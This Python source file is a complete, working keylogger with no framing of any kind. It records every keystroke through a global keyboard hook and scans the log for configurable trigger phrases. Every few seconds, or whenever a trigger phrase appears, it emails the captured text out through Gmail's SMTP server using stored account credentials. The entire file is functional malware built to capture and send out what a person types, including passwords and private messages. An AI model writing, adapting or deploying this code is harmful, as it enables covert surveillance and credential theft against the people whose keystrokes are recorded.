from threading import Timer

import keyboard
import smtplib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from Info import EMAIL_PASSWORD, EMAIL_ADDRESS

SEND_REPORT_EVERY = 5


def load_trigger_phrases(file_path):
    try:
        with open(file_path, "r") as file:

            return [line.strip() for line in file.readlines() if line.strip()]
    except Exception as e:
        print(f"Error loading trigger phrases: {e}")
        return []


class Keylogger:
    def __init__(self, interval, report_method="email", trigger_file="trigger_phrases.txt"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


        self.trigger_phrases = load_trigger_phrases(trigger_file)
        print(f"Trigger phrases loaded: {self.trigger_phrases}")

    def callback(self, event):

        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        self.check_trigger_phrase()

    def check_trigger_phrase(self):

        for phrase in self.trigger_phrases:
            if phrase.lower() in self.log.lower():
                print(f"Trigger phrase detected: {phrase}")
                self.sendmail(f"Keylogger Alert: Trigger Phrase Detected - {phrase}\nFull log: {self.log}",
                              is_triggered=True)
                self.log = ""
                break

    def prepare_mail(self, message):
        """Prepare the email to send."""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendmail(self, message, is_triggered=False):

        try:
            subject = "Keylogger logs"
            if is_triggered:
                subject = "Keylogger Alert: Trigger Phrase Detected"

            print("Connecting to Gmail SMTP server...")
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            print("Logging in...")
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            print("Sending email...")
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS,
                            self.prepare_mail(message))
            server.quit()
            print(f"{datetime.now()} - Sent an email to {EMAIL_ADDRESS} containing: {message}")
        except smtplib.SMTPException as e:
            print(f"SMTP error: {e}")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.sendmail(self.log)
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def update_filename(self):

        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def start(self):

        print(f"{datetime.now()} - Keylogger started")
        keyboard.on_release(callback=self.callback)
        keyboard.wait()


if __name__ == "__main__":

    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email", trigger_file="trigger_phrases.txt")

    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
